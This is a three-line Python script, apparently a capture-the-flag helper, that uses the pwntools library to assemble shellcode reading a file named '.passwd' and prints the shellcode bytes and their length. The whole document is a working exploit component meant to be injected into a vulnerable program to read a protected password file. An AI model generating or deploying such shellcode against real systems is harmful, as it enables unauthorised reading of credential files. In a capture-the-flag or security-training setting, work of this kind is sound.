from pwn import *
print( asm( shellcraft.cat(".passwd")  ) )
print( len (asm( shellcraft.cat(".passwd")  ) ))
